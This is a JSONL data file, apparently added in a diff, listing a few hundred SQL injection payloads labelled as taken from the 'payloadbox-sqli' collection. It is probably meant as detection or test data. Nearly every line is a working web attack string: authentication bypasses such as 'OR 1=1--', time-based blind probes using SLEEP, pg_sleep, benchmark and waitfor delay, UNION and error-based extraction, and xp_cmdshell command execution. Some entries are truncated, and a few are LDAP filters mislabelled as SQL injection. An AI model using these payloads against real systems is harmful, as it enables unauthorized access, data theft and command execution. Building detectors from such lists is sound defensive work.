+{"payload": "'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "'-'", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "'--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "'/*", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "'; exec master..xp_cmdshell", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "'; exec master..xp_cmdshell 'ping 172.10.1.255'--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "'; exec xp_regread", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "';waitfor delay '0:0:5'--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "'=\"or'", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "'=' 'or' and '=' 'or'", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "'OR '' = '\tAllows authentication without a valid username.", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "'OR 1=1--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "'\\\"", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "'^'", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "'hi' or 'x'='x';", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "'or 1=1 or ''='", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "'or'1=1", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "'or'1=1′", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "'sqlattempt1", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "'||UTL_HTTP.REQUEST", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "(", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "(SELECT * FROM (SELECT(SLEEP(5)))ecMj)", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "(SELECT * FROM (SELECT(SLEEP(5)))ecMj)#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "(select top 1", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "(sqlattempt2)", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "(sqlvuln)", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "(||6)", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": ")", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": ") and 0=benchmark(3000000,MD5(1))%20%23", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": ") and 0=benchmark(3000000,MD5(1))%20--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": ") and 0=benchmark(3000000,MD5(1))%20/*", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": ") or '1′='1–", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": ") or ('1′='1–", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": ") or ('a'='a", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": ") or (a=a", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": ") or benchmark(10000000,MD5(1))#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": ") or benchmark(10000000,MD5(1))#\"", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": ") or pg_sleep(__TIME__)--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": ") or sleep(__TIME__)=", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": ") or sleep(__TIME__)='", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": ") union select * from information_schema.tables;", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": ")%20or%20('x'='x", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": ")) and 0=benchmark(3000000,MD5(1))%20%23", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": ")) and 0=benchmark(3000000,MD5(1))%20--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": ")) and 0=benchmark(3000000,MD5(1))%20/*", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": ")) or benchmark(10000000,MD5(1))#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": ")) or pg_sleep(__TIME__)--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": ")) or pg_sleep(__TIME__)--\"", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": ")) or sleep(__TIME__)=\"\"\"", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": ")) or sleep(__TIME__)='", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "))) and 0=benchmark(3000000,MD5(1))%20%23", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "))) and 0=benchmark(3000000,MD5(1))%20--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "))) and 0=benchmark(3000000,MD5(1))%20/*", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": ")))) and 0=benchmark(3000000,MD5(1))%20%23", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": ")))) and 0=benchmark(3000000,MD5(1))%20--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": ")))) and 0=benchmark(3000000,MD5(1))%20/*", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "));waitfor delay '0:0:5'--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "));waitfor delay '0:0:__TIME__'--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": ");waitfor delay '0:0:5'--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": ");waitfor delay '0:0:__TIME__'--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "*(|(mail=*))", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "*(|(objectclass=*))", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "*/*", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "*|", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "+ SLEEP(10) + '", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "+benchmark(3200,SHA1(1))+'", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "+if(benchmark(3000000,MD5(1)),NULL,NULL))%20%23", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "+if(benchmark(3000000,MD5(1)),NULL,NULL))%20--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "+if(benchmark(3000000,MD5(1)),NULL,NULL))%20/*", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20%23", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20/*", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20%23", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20/*", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20%23", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20/*", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20%23", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20/*", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20%23", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20/*", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20%23", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20/*", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": ",@variable", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "-- &password=", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "/", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "/**/or/**/1/**/=/**/1", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "//", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "//*", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "0", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "0 or 1=1", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "0x730065006c0065006300740020004000400076006500 ...", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "0x770061006900740066006F0072002000640065006C00 ...", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "0x77616974666F722064656C61792027303A303A313027 ...", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "1 and 1=1", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "1 exec sp_ (or exec xp_)", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "1 or 1=1", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "1 or benchmark(10000000,MD5(1))#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "1 or pg_sleep(5)--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "1 or pg_sleep(__TIME__)--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "1 or sleep(5)#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "1 or sleep(__TIME__)#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "1 waitfor delay '0:0:10'--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "1' and 1=(select count(*) from tablenames); --", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "1' or '1'='1", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "1'1", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "1'or'1'='1", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "1) or benchmark(10000000,MD5(1))#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "1) or pg_sleep(5)--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "1) or pg_sleep(__TIME__)--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "1) or sleep(5)#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "1) or sleep(__TIME__)#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "1)) or benchmark(10000000,MD5(1))#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "1)) or pg_sleep(5)--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "1)) or pg_sleep(__TIME__)--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "1)) or sleep(5)#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "1)) or sleep(__TIME__)#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "1234 \" AND 1=0 UNION ALL SELECT \"admin\", \"81dc9bdb52d04dc20036dbd8313ed055", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "1;(load_file(char(47,101,116,99,47,112,97,115, ...", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "1;SELECT%20*", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "1or1=1", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "1′) and '1′='1–", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "21%", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "23 OR 1=1", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "26 %", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "26%", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "28%", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "29 %", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "29%", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "3.10E+17", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "; begin declare @var varchar(8000) set @var=' ...", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "; exec ('sel' + 'ect us' + 'er')", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "; exec master..xp_cmdshell", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "; exec master..xp_cmdshell 'ping 172.10.1.255'--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "; exec xp_regread", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "; execute immediate 'sel' || 'ect us' || 'er'", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "; or '1'='1'", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": ";waitfor delay '0:0:5'--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": ";waitfor delay '0:0:__TIME__'--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "<>\"'%;)(&+", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "<username>' OR 1=1--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "<username>'--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "=", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "==", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "?", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "@var select @var as var into temp end --", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "@variable", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AND (SELECT 4523 FROM(SELECT COUNT(*),CONCAT(0x716a7a6a71,(SELECT (ELT(4523=4523,1))),0x71706a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AND 1083=1083 AND ('1427=1427", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AND 1083=1083 AND (1427=1427", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AND 1=0", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AND 1=0 AND '%'='", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AND 1=0#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AND 1=0--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AND 1=1", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AND 1=1 AND '%'='", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AND 1=1#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AND 1=1--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AND 3516=CAST((CHR(113)||CHR(106)||CHR(122)||CHR(106)||CHR(113))||(SELECT (CASE WHEN (3516=3516) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(106)||CHR(107)||CHR(113)) AS NUMERIC)", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AND 5650=CONVERT(INT,(SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (5650=5650) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))--", "attack_type": "sqli", "source": "payloadbox-sqli"}
